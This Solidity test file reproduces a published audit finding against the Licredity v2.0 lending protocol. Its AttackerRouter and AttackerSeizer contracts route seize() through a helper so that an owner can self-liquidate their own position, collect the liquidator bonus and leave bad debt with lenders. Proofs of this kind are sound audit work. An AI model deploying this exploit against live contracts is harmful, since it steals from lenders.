// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Proof of Vulnerability for finding 62347 (Cyfrin, Licredity v2.0):
// "Proxy-Based self-liquidation creates bad debt for lenders".
//
// The position owner routes seize() through a helper contract so msg.sender in
// Licredity.seize is the helper, not the owner. That bypasses the
// CannotSeizeOwnPosition check. Inside one unlock() the owner opens a position,
// makes it unhealthy, then self-liquidates it and captures the liquidator bonus,
// pushing the shortfall onto lenders.
//
// Source: data_collection/tier1_after_2025-08-31/62347.md (published Cyfrin PoC).
// This test runs only offline, against the local audited commit e8ae10a.

import {Licredity} from "src/Licredity.sol";
import {Fungible} from "src/types/Fungible.sol";
import {Deployers} from "./utils/Deployer.sol";
import {StateLibrary} from "./utils/StateLibrary.sol";
import {ShareMath} from "./utils/ShareMath.sol";
import {BaseERC20Mock} from "test/mocks/BaseERC20Mock.sol";

contract PoV62347_Licredity is Deployers {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    BaseERC20Mock public token;

    function setUp() public {
        deployETHLicredityWithUniswapV4();
        deployAndSetOracleMock();
        deployLicredityRouter();

        token = _newAsset(18);

        oracleMock.setFungibleConfig(Fungible.wrap(address(token)), 1 ether, 100_000); // 10%
    }

    function test_seize_ownPosition_using_external_contract() public {
        /// open large position for existing lenders
        uint256 positionId = licredityRouter.open();
        token.mint(address(this), 10 ether);
        token.approve(address(licredityRouter), 10 ether);

        licredityRouter.depositFungible(positionId, Fungible.wrap(address(token)), 10 ether);

        uint128 borrowAmount = 9 ether;
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);

        licredityRouterHelper.addDebt(positionId, delta, address(1));

        // Attacker deploys router and helper contract to seize the position
        AttackerSeizer seizer = new AttackerSeizer(licredity);
        AttackerRouter attackerRouter = new AttackerRouter(licredity, token, seizer);

        // attack commences; it reverts if the self-liquidation is blocked
        attackerRouter.depositFungible(0.5 ether);
    }
}

contract AttackerRouter {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    Licredity public licredity;
    BaseERC20Mock public token;
    AttackerSeizer public seizer;

    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    function depositFungible(uint256 amount) external {
        // 1. add some collateral to the position
        //    so that it can become healthy after seize
        uint256 positionId = licredity.open();
        licredity.stageFungible(Fungible.wrap(address(token)));
        token.mint(address(licredity), amount);
        licredity.depositFungible(positionId);

        // 2. call unlock to take on debt and seize
        licredity.unlock(abi.encode(positionId));
        // 5. as `unlock` doesn't revert, the position has become healthy
    }

    function unlockCallback(bytes calldata data) public returns (bytes memory) {
        uint256 positionId = abi.decode(data, (uint256));

        // 3. increase debt share to make the position unhealthy
        uint128 borrowAmount = 1 ether;
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 delta = borrowAmount.toShares(totalAssets, totalShares);
        licredity.increaseDebtShare(positionId, delta, address(this));

        // 4. use the separate seizer contract to seize the position
        //    making it healthy again.
        seizer.seize(positionId);

        return new bytes(0);
    }
}

contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    function seize(uint256 positionId) external {
        licredity.seize(positionId, msg.sender);
    }
}
